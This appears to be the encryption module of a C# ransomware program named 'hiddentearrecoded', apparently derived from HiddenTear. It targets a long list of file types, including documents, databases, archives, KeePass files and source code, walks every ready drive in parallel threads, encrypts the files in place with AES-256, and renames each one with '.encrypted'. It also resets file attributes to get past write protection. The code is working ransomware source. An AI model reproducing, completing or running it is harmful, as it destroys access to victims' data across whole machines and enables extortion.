using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace hiddentearrecoded
{
    class Encryption
    {
        static string[] ValidExtensions = new[] {
                        ".txt", ".py", ".hc", ".mp4", ".7z", ".flp",".mkv" ,".flac", ".flv", ".dat", ".kdbx" , ".aep" , ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".raw" , ".jpg", ".jpeg" , ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".kxdb" , ".db"
        };

        public static void EncryptFile(string file, string password, byte[] SaltBytes)
        {
            Console.WriteLine(password);
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] PasswordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            PasswordBytes = SHA256.Create().ComputeHash(PasswordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, PasswordBytes, SaltBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            File.Move(file, file + ".encrypted");
        }

        public static void EncryptDirectory(string location, string password, byte[] SaltBytes)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                if (ValidExtensions.Contains(Path.GetExtension(files[i])))
                {
                    try
                    {
                        EncryptFile(files[i], password, SaltBytes);
                    }
                    catch
                    {
                        File.SetAttributes(files[i], FileAttributes.Normal);
                        try { EncryptFile(files[i], password, SaltBytes); } catch { }
                    }
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try { EncryptDirectory(childDirectories[i], password, SaltBytes); } catch { }
            }
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] PasswordBytes, byte[] SaltBytes)
        {
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(PasswordBytes, SaltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public static void StartEncryption(string password, byte[] SaltBytes)
        {
            if (!Program.DebugMode)
            {
                List<Thread> Threads = new List<Thread>();
                foreach (DriveInfo d in DriveInfo.GetDrives())
                {
                    if (d.IsReady == true)
                    {
                        Threads.Add(new Thread(() =>
                        {
                            Logger.Log($"Adding drive {d.Name} to encrypt threads");
                            try { EncryptDirectory(d.Name, password, SaltBytes); } catch { }
                        }));
                    }
                }

                foreach (Thread t in Threads)
                    t.Start();
                foreach (Thread t in Threads)
                    t.Join();
            }
            else
            {
                EncryptDirectory("D:\\Testdir", password, SaltBytes);
            }
        }

    }
}
